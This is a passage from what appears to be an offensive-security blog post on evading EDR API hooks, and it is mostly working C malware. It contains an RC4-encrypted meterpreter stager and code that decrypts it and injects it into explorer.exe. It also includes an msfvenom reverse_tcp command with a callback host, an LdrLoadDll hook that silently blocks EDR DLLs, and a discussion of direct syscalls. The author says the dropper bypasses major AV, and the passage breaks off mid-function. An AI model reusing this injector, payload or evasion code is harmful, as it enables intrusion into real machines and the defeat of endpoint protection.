0xdc, 0x5b, 0x2a, 0x59, 0xba, 0x87, 0x64, 0x3e, 0x1d, 0x15, 0xcc, 0x55, 0x5e, 0x70, 0xdd, 0xf3, 0x57, 0x98, 0x96, 0x2a, 0xd0, 0x0f, 0xe5, 0x5a, 0xcd, 0xab, 0x28, 0xb3, 0xda, 0xff, 0x70, 0xd5, 0x48, 0x25, 0x7f, 0xaf, 0x87, 0x0b, 0xd4, 0xd5, 0x89, 0x44, 0xa8, 0x47, 0xc1, 0x0d, 0xce, 0x17, 0xf3, 0x64, 0x72, 0x70, 0xd4, 0xd8, 0x5f, 0xfe, 0x66, 0xe1, 0x20, 0x21, 0x89, 0x43, 0xf2, 0xd9, 0x95, 0x17, 0x4e, 0x96, 0xe7, 0x9a, 0xab, 0xa8, 0x14, 0xc9, 0x85, 0x4c, 0x23, 0x5d, 0x8a, 0x24, 0xef, 0x5e, 0x3b, 0xe7, 0x14, 0x74, 0x65, 0x6a, 0x20, 0xe2, 0x03, 0x89, 0x84, 0xfa, 0x9d, 0xf1, 0x97, 0x46, 0xc9, 0x50, 0xc1, 0x07, 0xf6, 0x49, 0xd1, 0x2d, 0x35, 0x45, 0x66, 0x06, 0xf7, 0x49, 0x9b, 0xc8, 0x0b, 0x0e, 0xc1, 0x3b, 0x71, 0x7c, 0xef, 0xbe, 0x94, 0xd5, 0x81, 0xbe, 0x5f, 0x81, 0x6c, 0x7f, 0x18, 0x1e, 0xd7, 0x3f, 0x93, 0x0f, 0x7e, 0x09, 0x2f, 0x53, 0x6c, 0x04, 0x34, 0x77, 0x61, 0x54, 0x56, 0x8f, 0x43, 0xd7, 0x5b, 0xc3, 0x29, 0x1e, 0x16, 0xda, 0xf3, 0x58, 0x83, 0x8c, 0xd7, 0xf2, 0x3d, 0x4c, 0xb4, 0x3d, 0xcb, 0x24, 0xfa, 0x84, 0x00, 0x58, 0x28, 0x96, 0xe0, 0x1b, 0x57, 0x03, 0x2e, 0xc6, 0xc5, 0x22, 0x31, 0xc1, 0x1d, 0xe4, 0xd5, 0x8a, 0x4c, 0x79, 0x5f, 0x83, 0x05, 0xe3, 0x73, 0x8c, 0x11, 0x9e, 0x57, 0xcf, 0x5f, 0xa9, 0x7b, 0x26, 0xfa, 0xc3, 0xad, 0xd1, 0x2c, 0x57, 0x32, 0xbe, 0x3a, 0x41, 0x18, 0x55, 0x87, 0x74, 0xc0, 0xbf, 0x26, 0xd8, 0x01, 0xf0, 0x15, 0xdd, 0x2b, 0xe6, 0x35, 0x7a, 0xcc, 0x18, 0x83, 0xf4, 0xdd, 0xc9, 0x75, 0x68, 0x12, 0x6d, 0x19, 0x10, 0x2b, 0xb6, 0x89, 0x20, 0x35, 0xd4, 0x81, 0x36, 0xe2, 0x4d, 0xf0, 0xfb, 0x1d, 0x0f, 0xfa, 0xb6, 0x9e, 0x74, 0x2d, 0x51, 0x33, 0x79, 0xa8, 0xc1, 0xda, 0x55, 0x14, 0x87, 0x44, 0xc2, 0x19, 0x28, 0x28, 0x8a, 0xe9, 0x24, 0x01, 0x99, 0xae, 0xa4, 0xa1, 0xdf, 0xb1, 0xcf, 0x87, 0x54, 0x93, 0x51, 0xcc, 0xb7, 0x02, 0x4c, 0x2e, 0xeb, 0xdc, 0x7c, 0x72, 0xbe, 0x4b, 0x2c, 0xaa, 0x34, 0x44, 0x6f, 0xbb, 0xc5, 0x79, 0x20, 0xb9, 0x67, 0x52, 0x1e, 0x28, 0x71, 0x40, 0x72, 0xa6, 0x5b, 0x4f, 0xa0, 0xc2, 0x1e, 0x2e, 0x6f, 0x48, 0x16, 0x1a, 0x3a, 0xfd, 0xb5, 0x9b, 0x84, 0x3c, 0x9c, 0x4c, 0x61, 0x63, 0xe0, 0x34, 0x57, 0x24, 0xab, 0x6c, 0x3e, 0xb3, 0x8a, 0x02, 0x74, 0x59, 0x27, 0x20, 0x0f, 0xd5, 0x8e, 0x1e, 0x5c, 0x43, 0x61, 0xf0, 0x4d, 0x5b, 0xb3, 0x00, 0xea, 0x18, 0xb2, 0xef, 0x43, 0x94, 0xd8, 0x5d, 0x5d, 0x4b, 0xc6, 0xd9, 0xed, 0x2f, 0xca, 0xed, 0xe1, 0x79, 0x0c, 0xa1, 0x46, 0x77, 0x78, 0x15, 0x87, 0x9d, 0xea, 0x9e, 0xa6, 0x8b, 0x10, 0x29, 0x49, 0x28, 0xca, 0xc1, 0x07, 0x19, 0x9b, 0x54, 0xb2, 0x1b, 0xd2, 0x9b, 0xbc, 0x7d, 0x9c, 0x14, 0x97, 0x43, 0x7b, 0x33, 0x41, 0xd3, 0x26, 0x7f, 0xe9, 0xf1, 0xbf, 0xfb, 0xd8, 0xc5, 0x96, 0x19, 0x5e, 0x65, 0xa3, 0xb1, 0x18, 0x44, 0x16, 0xc1, 0x63, 0x72, 0xc8, 0x53, 0xa5, 0x74, 0xee, 0x2c, 0x7c, 0xe2, 0x0f, 0xe4, 0x11, 0x91, 0x4d, 0xe3, 0xa4, 0xa6, 0xd9, 0xf0, 0x59, 0x97, 0xbb, 0x86, 0x1e, 0xc4, 0x68, 0x64, 0x4b, 0x45, 0x00, 0xf0, 0x78, 0xac, 0x98, 0x21, 0xfe, 0xd3, 0xdd, 0xe8, 0xa3, 0xca, 0x0d, 0x77, 0xb8, 0xab, 0x7c, 0xe2, 0x64, 0x26, 0x37, 0x76, 0x85, 0x92, 0x91, 0x2e, 0x62, 0x25, 0x6b, 0x3e, 0xd5, 0xf2, 0xf0, 0x9a, 0xda, 0xc3, 0x60, 0x90, 0xca, 0x00, 0x04, 0x19 }; unsigned int encmeter_bin_len = 510; /****************************************************************************************************/ // define our imports typedef HANDLE (WINAPI * OpenProcess_) (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); typedef LPVOID (WINAPI * VirtualAllocEx_) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef WINBOOL (WINAPI * WriteProcessMemory_) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); typedef HANDLE (WINAPI * CreateRemoteThread_) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); BOOL DecryptShellcode() { BOOL bSuccess = TRUE; HCRYPTKEY hCryptoKey; HCRYPTHASH hCryptHash; HCRYPTPROV hCryptoProv; DWORD dwLen = 16; BYTE* pbKey = \"HideMyShellzPlz?\"; bSuccess = CryptAcquireContextW(\u0026hCryptoProv, NULL, L\"Microsoft Enhanced RSA and AES Cryptographic Provider\", PROV_RSA_AES, CRYPT_VERIFYCONTEXT); if (!bSuccess) { goto CLEANUP; } bSuccess = CryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, \u0026hCryptHash); if (!bSuccess) { goto CLEANUP; } bSuccess = CryptHashData(hCryptHash, pbKey, dwLen, 0); if (!bSuccess) { goto CLEANUP; } bSuccess = CryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,\u0026hCryptoKey); if (!bSuccess) { goto CLEANUP; } bSuccess = CryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, \u0026encmeter_bin_len); if (!bSuccess) { goto CLEANUP; } goto CLEANUP; CLEANUP: CryptReleaseContext(hCryptoProv, 0); CryptDestroyKey(hCryptoKey); CryptDestroyHash(hCryptHash); return bSuccess; } DWORD FindExplorer() { PROCESSENTRY32 pe32 = {0}; pe32.dwSize = sizeof(PROCESSENTRY32); HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hSnapshot) { if(Process32First(hSnapshot, \u0026pe32)) { do { if (strcmp(pe32.szExeFile, \"explorer.exe\") == 0) { return pe32.th32ProcessID; } } while(Process32Next(hSnapshot, \u0026pe32)); CloseHandle(hSnapshot); } } return -1; } int main(int argc, char const *argv[]) { DWORD dwPid; LPVOID lpBuffer; HANDLE hProcess, hThread; // resolve imports OpenProcess_ fnOpenProcess = (OpenProcess_)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"OpenProcess\"); VirtualAllocEx_ fnVirtualAllocEx = (VirtualAllocEx_)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAllocEx\"); WriteProcessMemory_ fnWriteProcessMemory = (WriteProcessMemory_)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WriteProcessMemory\"); CreateRemoteThread_ fnCreateRemoteThread = (CreateRemoteThread_)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CreateRemoteThread\"); // find the pid of explorer.exe dwPid = FindExplorer(); if (dwPid == -1) { printf(\"[!] Failed to find process\\\\n\"); return -1; } // get a handle on the process hProcess = fnOpenProcess(PROCESS_ALL_ACCESS, 0, dwPid); // alloc memory lpBuffer = fnVirtualAllocEx(hProcess, NULL, (SIZE_T)encmeter_bin_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); // decrypt the shellcode if (!DecryptShellcode()) { printf(\"[!] Failed to decrypt shellcode\\\\n\"); return -1; } // write the shellcode to the process fnWriteProcessMemory(hProcess, lpBuffer, encmeter_bin, encmeter_bin_len, NULL); // start the shellcode hThread = fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, 0, NULL); if (hThread == INVALID_HANDLE_VALUE) { printf(\"[!] Failed to inject shellcode\\\\n\"); return -1; } printf(\"[+] Successfully injected shellcode\\\\n\"); return 0; } It’s an pretty basic bit of malware that will simply inject a meterpreter stager into explorer.exe using well known, unsophisticated methods. Despite this it will easily bypass the detection’s used by major AV vendors. It’s not so lucky with EDR solutions though, as within seconds there is critical alerts flying all over the place. So whats different? Why does it beat AV yet fail miserably against EDR?\nOne of the most common methods EDR solutions will use is API hooking, as it gives it the ability to monitor the functions being called along with the arguments being passed to them. This is a problem for the above code, as by using API hooking its possible to extract the decrypted shellcode while its still in memory but before it has been written to the process, then assess weather it is malicious or if it should be allowed to be written to the remote process.\nI have written some PoC code to show how an EDR solution can hook an API call (kernel32!WriteProcessMemory but could be ntdll!NtWriteVirtualMemory) then extract the shellcode being written to a remote process.\n#include \u003cstdio.h\u003e #include \u003cwindows.h\u003e #define BUFFER_FILE \".\\\\\\\\wpm_buffer.bin\" // definitions typedef WINBOOL (WINAPI * WriteProcessMemory_) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); char OrgWriteProcMem[50] = {}; BOOL RestoreHook(LPVOID lpAddr, CHAR* OrgBytes); BOOL PlaceHook(LPVOID lpAddr, PVOID lpHookAddr, CHAR* lpSaveBytes); BOOL hWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) { HANDLE hFile; DWORD BytesWritten; CHAR lpMessage[5000]; hFile = CreateFile((LPCSTR)BUFFER_FILE, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { MessageBox(NULL, \"CreateFile: Failed to write buffer to file\", NULL, 0); goto CALLFUNC; } if(!WriteFile(hFile, lpBuffer, nSize, \u0026BytesWritten, NULL)) { MessageBox(NULL, \"WriteFile: Failed to write buffer to file\", NULL, 0); goto CALLFUNC; } sprintf(lpMessage, \"Detected WriteProcessMemory.\\\\n\\\\nStored buffer in %s (%d bytes)\", BUFFER_FILE, BytesWritten); MessageBox(NULL, (LPCTSTR)lpMessage, \"WriteProcessMemory\", 0); goto CALLFUNC; CALLFUNC: // close the file handle CloseHandle(hFile); // restore the function LPVOID lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(\"kernel32\"), \"WriteProcessMemory\"); RestoreHook(lpAddr, OrgWriteProcMem); // call the function WriteProcessMemory_ cWriteProcessMemory = (WriteProcessMemory_)GetProcAddress(GetModuleHandle(\"kernel32\"), \"WriteProcessMemory\"); BOOL bRet = cWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten); // place the hook back again PlaceHook(lpAddr, \u0026hWriteProcessMemory, \u0026OrgWriteProcMem); return bRet; } BOOL RestoreHook(LPVOID lpAddr, CHAR* OrgBytes) { DWORD oldProtect, oldOldProtect; VirtualProtect(lpAddr, sizeof(OrgBytes), PAGE_EXECUTE_READWRITE, \u0026oldProtect); memcpy(lpAddr, OrgBytes, sizeof(OrgBytes)); VirtualProtect(lpAddr, sizeof(OrgBytes), oldProtect, \u0026oldProtect); return TRUE; } BOOL PlaceHook(LPVOID lpAddr, PVOID lpHookAddr, CHAR* lpSaveBytes) { DWORD oldProtect, oldOldProtect; // save the bytes memcpy(lpSaveBytes, lpAddr, 50); // our trampoline unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 }; // add in the address of our hook *(void **)(boing + 2) = lpHookAddr; // write the hook VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, \u0026oldProtect); memcpy(lpAddr, boing, sizeof(boing)); VirtualProtect(lpAddr, 13, oldProtect, \u0026oldProtect); return TRUE; } DWORD DoHooking() { // hook WriteProcessMemory LPVOID lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(\"kernel32\"), \"WriteProcessMemory\"); PlaceHook(lpAddr, \u0026hWriteProcessMemory, \u0026OrgWriteProcMem); } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { switch( fdwReason ) { case DLL_PROCESS_ATTACH: DoHooking(); } } I compiled this code as a DLL and injecting it into the above meterpreter dropper at start up (which is commonly how an EDR solution will set its API hooks). Looking at the disassembly of the kernel32!WriteProcessMemoryStub function in a debugger you can see that the functions code has been completely replaced and is now forcing a jmp to the r11 register which holds the address of the hook (hook!hWriteProcessMemory).\nLeading to our hook capturing the contents of the buffer\nWhich when then uploaded to VirusTotal shows its clearly malicious\nSo how can we beat this? It’s possible that we could restore the functions original code, but if the EDR is performing integrity checks on its hooks then that will cause unwanted alerts when they fail. What would be best is to find a way to either prevent the DLL that places the hooks from being injected or to be able to call the hooked functions without having to get caught by the hooks.\nXPN did some good research into how you can use Process Mitigation Policy’s to enforce the only Microsoft signed DLLS are allowed to be loaded into your process, or using Arbitrary Code Guard (ACG) to prevent the allocation or modification of executable pages of memory. Using ACG does look very promising, though sadly it’s possible to disable ACG in a remote process with elevate privileges.\nWhen tackling this problem I wanted to find a way to prevent the DLL from being injected, while keeping the EDR thinking that the DLL had been loaded successfully (which would not be the case when using Mitigation Policy’s or ACG). To do this I figured it would be best to target the process of the DLL being mapped inside my process rather than when its getting injected into my process.\nA classic DLL injection method looks like this.\nVOID InjectDll(DWORD dwPid, LPCVOID lpDllPath) { LPVOID lpBuffer; HANDLE hProcess, hThread; hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid); if (!hProcess) { return; } lpBuffer = VirtualAllocEx(hProcess, NULL, strlen(lpDllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, lpBuffer, lpDllPath, strlen(lpDllPath), NULL); PTHREAD_START_ROUTINE pLoadLib = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"); CreateRemoteThread(hProcess, NULL, 0, pLoadLib, lpBuffer, 0, NULL); return; } And essentially boils down to creating a thread in the process and calling LoadLibrary with the argument of the DLL you wish to inject. The LoadLibrary function is then responsible for mapping the DLL into the process. Originally I was going to target LoadLibrary but the problem with that is there is a few variations like kernel32!LoadLibraryA or kernel32!LoadLibraryW that the loader could use. So instead I decided to target ntdll!LdrLoadDll which is called by all variations of LoadLibrary.\nThe following code will hook ntdll!LdrLoadDll and check every DLL that is attempted to be loaded against a hard coded whitelist of DLLs that should be allowed inside our process. If its on the list it will be mapped into memory like normal. If its not on this list then it will be ignored but the function will return like it has been mapped successfully.\n#include \u003cstdio.h\u003e #include \u003cwindows.h\u003e #include \u003cwinternl.h\u003e #define dwAllowDllCount 1 CHAR cAllowDlls[dwAllowDllCount][MAX_PATH] = { \"W:\\\\\\\\allowed.dll\" }; VOID HookLoadDll(LPVOID lpAddr); NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress); typedef void (WINAPI * LdrLoadDll_) (PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress); LPVOID lpAddr; CHAR OriginalBytes[50] = {}; NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress) { INT i; DWORD dwOldProtect; BOOL bAllow = FALSE; DWORD dwbytesWritten; CHAR cDllName[MAX_PATH]; sprintf(cDllName, \"%S\", DllName-\u003eBuffer); for (i = 0; I \u003c dwAllowDllCount; i++) { if (strcmp(cDllName, cAllowDlls[i]) == 0) { bAllow = TRUE; printf(\"Allowing DLL: %s\\\\n\", cDllName); VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, \u0026dwOldProtect); memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes)); VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, \u0026dwOldProtect); LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary(\"ntdll.dll\"), \"LdrLoadDll\"); LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress); HookLoadDll(lpAddr); } } if (!bAllow) { printf(\"Blocked DLL: %s\\\\n\", cDllName); } return TRUE; } VOID HookLoadDll(LPVOID lpAddr) { DWORD oldProtect, oldOldProtect; void *hLdrLoadDll = \u0026_LdrLoadDll; // our trampoline unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 }; // add in the address of our hook *(void **)(boing + 2) = \u0026_LdrLoadDll; // write the hook VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, \u0026oldProtect); memcpy(lpAddr, boing, sizeof(boing)); VirtualProtect(lpAddr, 13, oldProtect, \u0026oldProtect); return; } int main(int argc, char const *argv[]) { printf(\"LdrLoadDll hook example - @_batsec_\\\\n\\\\n\"); // get addresss of where the hook should be lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"LdrLoadDll\"); // save the original bytes memcpy(OriginalBytes, lpAddr, 50); // set the hook HookLoadDll(lpAddr); while (TRUE) { continue; } return 0; } And as you can see when running it, W:\\\\allowed.dll to be mapped but W:\\\\functionhooks.dll is blocked.\nThis technique works well but the downside of it is that there is a bit of a race between how fast the hook can be placed and how fast the EDRs DLL is loaded. If the DLL is loaded before the LdrLoadDll hook is placed then this technique has little effect. It is also worth pointing out that if the EDR uses a non standard method of loading a DLL - like manually mapping it - this technique probably will not work. So I recommend using a mix of all these techniques as I have done in shad0w\nSo preventing the DLL from being injected is good, but what about if we are in the worst case scenario and our functions have been hooked? How can we avoid these hooks, while continuing normal execution and keeping there integrity?\nThis is where syscalls come in. They allow you to directly call the kernel, missing out any Windows API functions. This is extremely useful as the EDRs hooks can only be placed in usermode due to Kernel Patch Protection so by calling the kernel directly we can completely miss them out.\nDirectly calling sycalls requires a bit more effort because you have to handle everything the windows API would normally do behind the scenes. You will also have to either write and link your own assembly (it will have to be version specific because syscall numbers change between windows versions) or you can dynamically resolve the syscall numbers by reading it directly from ntdll.dll. You can find an example of this in the implementation I wrote for shad0w or in HellsGate. For more robust implementations, dynamically resolving syscalls is much better as without obfuscation it is very easy to signature the syscall assembly.\nThe full source code for this injector can be found on my github. Here is a snippet of the main code, it includes the LdrLoadDll hook and syscalls. It is worth noting that this code will only defend against userland hooks, it will trigger a Sysmon Event ID 8 as well as other things so I will leave it as a challenge for the reader to adapt this code and make it better. This could be of use to you if you decide to do that.\n#include \u003cstdio.h\u003e #include \u003cwindows.h\u003e #include \u003cwincrypt.h\u003e #include \u003ctlhelp32.h\u003e #include \u003cntdef.h\u003e #include \u003cwinternl.h\u003e #include \"main.h\" /****************************************************************************************************/ // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin // cat meter.bin | openssl enc -rc4 -nosalt -k \"HideMyShellzPlz?\" \u003e encmeter.bin // xxd -i encmeter.bin unsigned char encmeter_bin[] = { 0x6e, 0xdc, 0x5b, 0x2a, 0x59, 0xba, 0x87, 0x64, 0x3e, 0x1d, 0x15, 0xcc, 0x55, 0x5e, 0x70, 0xdd, 0xf3, 0x57, 0x98, 0x96, 0x2a, 0xd0, 0x0f, 0xe5, 0x5a, 0xcd, 0xab, 0x28, 0xb3, 0xda, 0xff, 0x70, 0xd5, 0x48, 0x25, 0x7f, 0xaf, 0x87, 0x0b, 0xd4, 0xd5, 0x89, 0x44, 0xa8, 0x47, 0xc1, 0x0d, 0xce, 0x17, 0xf3, 0x64, 0x72, 0x70, 0xd4, 0xd8, 0x5f, 0xfe, 0x66, 0xe1, 0x20, 0x21, 0x89, 0x43, 0xf2, 0xd9, 0x95, 0x17, 0x4e, 0x96, 0xe7, 0x9a, 0xab, 0xa8, 0x14, 0xc9, 0x85, 0x4c, 0x23, 0x5d, 0x8a, 0x24, 0xef, 0x5e, 0x3b, 0xe7, 0x14, 0x74, 0x65, 0x6a, 0x20, 0xe2, 0x03, 0x89, 0x84, 0xfa, 0x9d, 0xf1, 0x97, 0x46, 0xc9, 0x50, 0xc1, 0x07, 0xf6, 0x49, 0xd1, 0x2d, 0x35, 0x45, 0x66, 0x06, 0xf7, 0x49, 0x9b, 0xc8, 0x0b, 0x0e, 0xc1, 0x3b, 0x71, 0x7c, 0xef, 0xbe, 0x94, 0xd5, 0x81, 0xbe, 0x5f, 0x81, 0x6c, 0x7f, 0x18, 0x1e, 0xd7, 0x3f, 0x93, 0x0f, 0x7e, 0x09, 0x2f, 0x53, 0x6c, 0x04, 0x34, 0x77, 0x61, 0x54, 0x56, 0x8f, 0x43, 0xd7, 0x5b, 0xc3, 0x29, 0x1e, 0x16, 0xda, 0xf3, 0x58, 0x83, 0x8c, 0xd7, 0xf2, 0x3d, 0x4c, 0xb4, 0x3d, 0xcb, 0x24, 0xfa, 0x84, 0x00, 0x58, 0x28, 0x96, 0xe0, 0x1b, 0x57, 0x03, 0x2e, 0xc6, 0xc5, 0x22, 0x31, 0xc1, 0x1d, 0xe4, 0xd5, 0x8a, 0x4c, 0x79, 0x5f, 0x83, 0x05, 0xe3, 0x73, 0x8c, 0x11, 0x9e, 0x57, 0xcf, 0x5f, 0xa9, 0x7b, 0x26, 0xfa, 0xc3, 0xad, 0xd1, 0x2c, 0x57, 0x32, 0xbe, 0x3a, 0x41, 0x18, 0x55, 0x87, 0x74, 0xc0, 0xbf, 0x26, 0xd8, 0x01, 0xf0, 0x15, 0xdd, 0x2b, 0xe6, 0x35, 0x7a, 0xcc, 0x18, 0x83, 0xf4, 0xdd, 0xc9, 0x75, 0x68, 0x12, 0x6d, 0x19, 0x10, 0x2b, 0xb6, 0x89, 0x20, 0x35, 0xd4, 0x81, 0x36, 0xe2, 0x4d, 0xf0, 0xfb, 0x1d, 0x0f, 0xfa, 0xb6, 0x9e, 0x74, 0x2d, 0x51, 0x33, 0x79, 0xa8, 0xc1, 0xda, 0x55, 0x14, 0x87, 0x44, 0xc2, 0x19, 0x28, 0x28, 0x8a, 0xe9, 0x24, 0x01, 0x99, 0xae, 0xa4, 0xa1, 0xdf, 0xb1, 0xcf, 0x87, 0x54, 0x93, 0x51, 0xcc, 0xb7, 0x02, 0x4c, 0x2e, 0xeb, 0xdc, 0x7c, 0x72, 0xbe, 0x4b, 0x2c, 0xaa, 0x34, 0x44, 0x6f, 0xbb, 0xc5, 0x79, 0x20, 0xb9, 0x67, 0x52, 0x1e, 0x28, 0x71, 0x40, 0x72, 0xa6, 0x5b, 0x4f, 0xa0, 0xc2, 0x1e, 0x2e, 0x6f, 0x48, 0x16, 0x1a, 0x3a, 0xfd, 0xb5, 0x9b, 0x84, 0x3c, 0x9c, 0x4c, 0x61, 0x63, 0xe0, 0x34, 0x57, 0x24, 0xab, 0x6c, 0x3e, 0xb3, 0x8a, 0x02, 0x74, 0x59, 0x27, 0x20, 0x0f, 0xd5, 0x8e, 0x1e, 0x5c, 0x43, 0x61, 0xf0, 0x4d, 0x5b, 0xb3, 0x00, 0xea, 0x18, 0xb2, 0xef, 0x43, 0x94, 0xd8, 0x5d, 0x5d, 0x4b, 0xc6, 0xd9, 0xed, 0x2f, 0xca, 0xed, 0xe1, 0x79, 0x0c, 0xa1, 0x46, 0x77, 0x78, 0x15, 0x87, 0x9d, 0xea, 0x9e, 0xa6, 0x8b, 0x10, 0x29, 0x49, 0x28, 0xca, 0xc1, 0x07, 0x19, 0x9b, 0x54, 0xb2, 0x1b, 0xd2, 0x9b, 0xbc, 0x7d, 0x9c, 0x14, 0x97, 0x43, 0x7b, 0x33, 0x41, 0xd3, 0x26, 0x7f, 0xe9, 0xf1, 0xbf, 0xfb, 0xd8, 0xc5, 0x96, 0x19, 0x5e, 0x65, 0xa3, 0xb1, 0x18, 0x44, 0x16, 0xc1, 0x63, 0x72, 0xc8, 0x53, 0xa5, 0x74, 0xee, 0x2c, 0x7c, 0xe2, 0x0f, 0xe4, 0x11, 0x91, 0x4d, 0xe3, 0xa4, 0xa6, 0xd9, 0xf0, 0x59, 0x97, 0xbb, 0x86, 0x1e, 0xc4, 0x68, 0x64, 0x4b, 0x45, 0x00, 0xf0, 0x78, 0xac, 0x98, 0x21, 0xfe, 0xd3, 0xdd, 0xe8, 0xa3, 0xca, 0x0d, 0x77, 0xb8, 0xab, 0x7c, 0xe2, 0x64, 0x26, 0x37, 0x76, 0x85, 0x92, 0x91, 0x2e, 0x62, 0x25, 0x6b, 0x3e, 0xd5, 0xf2, 0xf0, 0x9a, 0xda, 0xc3, 0x60, 0x90, 0xca, 0x00, 0x04, 0x19 }; unsigned int encmeter_bin_len = 510; /****************************************************************************************************/ NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress) { INT i; DWORD dwOldProtect; BOOL bAllow = FALSE; DWORD dwbytesWritten; CHAR cDllName[MAX_PATH]; // change to a char sprintf(cDllName, \"%S\", DllName-\u003eBuffer); for (i = 0; I \u003c dwAllowDllCount; i++) { // is it on the whitelist if (strcmp(cDllName, cAllowDlls[i]) == 0) { bAllow = TRUE; printf(\"Allowing DLL: %s\\\\n\", cDllName); // repatch LdrLoadDll and call it VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, \u0026dwOldProtect); memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes)); VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, \u0026dwOldProtect); LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary(\"ntdll.dll\"), \"LdrLoadDll\"); LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress); // then hook it again HookLoadDll(lpAddr); } } if (!bAllow) { printf(\"Blocked DLL: %s\\\\n\", cDllName); } return TRUE; } VOID HookLoadDll(LPVOID lpAddr) { DWORD oldProtect, oldOldProtect; void *hLdrLoadDll = \u0026_LdrLoadDll; // our trampoline unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 }; // add in the address of our hook *(void **)(boing + 2) = \u0026_LdrLoadDll; // write the hook VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, \u0026oldProtect); memcpy(lpAddr, boing, sizeof(boing)); VirtualProtect(lpAddr, 13, oldProtect, \u0026oldProtect); return; } BOOL DecryptShellcode() { BOOL bSuccess = TRUE; HCRYPTKEY hCryptoKey; HCRYPTHASH hCryptHash; HCRYPTPROV hCryptoProv; BYTE* pbKey = \"HideMyShellzPlz?\"; DWORD dwLen = strlen(pbKey); // get the crypto context bSuccess = fnCryptAcquireContextW(\u0026hCryptoProv, NULL, L\"Microsoft Enhanced RSA and AES Cryptographic Provider\", PROV_RSA_AES, CRYPT_VERIFYCONTEXT); if (!bSuccess) { printf(\"CryptAcquireContextW\\\\n\"); goto CLEANUP; } // init an create the hashing handle bSuccess = fnCryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, \u0026hCryptHash); if (!bSuccess) { printf(\"CryptCreateHash\\\\n\"); goto CLEANUP; } // add the key to the hash object bSuccess = fnCryptHashData(hCryptHash, pbKey, dwLen, 0); if (!bSuccess) { printf(\"CryptHashData\\\\n\"); goto CLEANUP; } // gen the session keys from the hash bSuccess = fnCryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,\u0026hCryptoKey); if (!bSuccess) { printf(\"CryptDeriveKey\\\\n\"); goto CLEANUP; } // decrypt the buffer bSuccess = fnCryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, \u0026encmeter_bin_len); if (!bSuccess) { printf(\"CryptDecrypt: %d\\\\n\", GetLastError()); goto CLEANUP; } goto CLEANUP; CLEANUP: 